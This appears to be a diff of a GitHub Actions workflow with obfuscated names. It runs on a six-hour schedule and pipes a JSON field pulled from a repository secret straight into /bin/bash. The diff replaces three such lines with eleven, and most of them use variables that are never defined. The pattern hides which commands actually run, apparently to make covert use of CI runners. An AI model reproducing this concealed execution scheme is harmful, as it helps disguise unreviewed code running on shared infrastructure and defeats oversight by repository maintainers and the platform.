@@ -1,19 +1,27 @@
 name: yezhongshu2603
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '50 3/6 * * *'
+    - cron: '9 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: yezhongshu2603
         env:
-          m8: ${{ secrets.m8 }}
+          yy0: ${{ secrets.yy0 }}
         run: |
-          echo $m8 | jq -r .kds28396 | /bin/bash
-          echo $bash53054 | jq -r .kj3 | /bin/bash
-          echo $ttqgg77012 | jq -r .l2965 | /bin/bash
+          echo $yy0 | jq -r .cf7 | /bin/bash
+          echo $n7 | jq -r .iuqul23 | /bin/bash
+          echo $zjqsy5193 | jq -r .eende358 | /bin/bash
+          echo $semp9 | jq -r .lkko43931 | /bin/bash
+          echo $hga93 | jq -r .k22 | /bin/bash
+          echo $fgxa4063 | jq -r .ehwyd6712 | /bin/bash
+          echo $gg5 | jq -r .nkc7188 | /bin/bash
+          echo $fmei54 | jq -r .scmuk6 | /bin/bash
+          echo $ievwj979 | jq -r .djmw2469 | /bin/bash
+          echo $uo31 | jq -r .wlguv87271 | /bin/bash
+          echo $pal496 | jq -r .p8 | /bin/bash
 
